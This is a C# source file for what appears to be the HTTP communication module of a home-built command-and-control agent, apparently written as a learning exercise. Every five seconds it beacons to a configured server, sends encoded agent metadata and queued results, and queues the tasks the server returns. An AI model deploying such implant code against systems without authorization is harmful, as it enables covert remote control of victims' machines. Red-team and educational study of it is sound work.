using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }
        private CancellationTokenSource _tokenSource;
        private HttpClient _client;
        public HttpCommModule(string connectAddress,int connectPort)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }
        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);

            _client = new HttpClient();
            _client.BaseAddress = new System.Uri($"http://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();
            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialize());
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");

        }
        public override async Task Start()
        {
            System.Console.WriteLine("Starting tasks loop?");
            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                // write function that gets jitter?
                System.Console.WriteLine("checking...");
                // check to see if we have data to send
                if (!Outbound.IsEmpty)
                {
                    System.Console.WriteLine("sending data...");
                    await PostData();
                }
                else
                {
                    System.Console.WriteLine("checking in..");
                    await Checkin();
                }
                System.Console.WriteLine("Before SLEEP!");
                await Task.Delay(5000);
            }
        }

        private async Task Checkin()
        {
            var response = await _client.GetByteArrayAsync("/");
            System.Console.WriteLine(response.ToString());
            System.Console.WriteLine("After wait on get req");
            HandleResponse(response);
        }

        private async Task PostData()
        {
            var outbound = GetOutbound().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(outbound),Encoding.UTF8,"application/json");
            var response = await _client.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();
            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    System.Console.WriteLine(task.Id);
                    Inbound.Enqueue(task);
                }
            }
        }
        public override void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
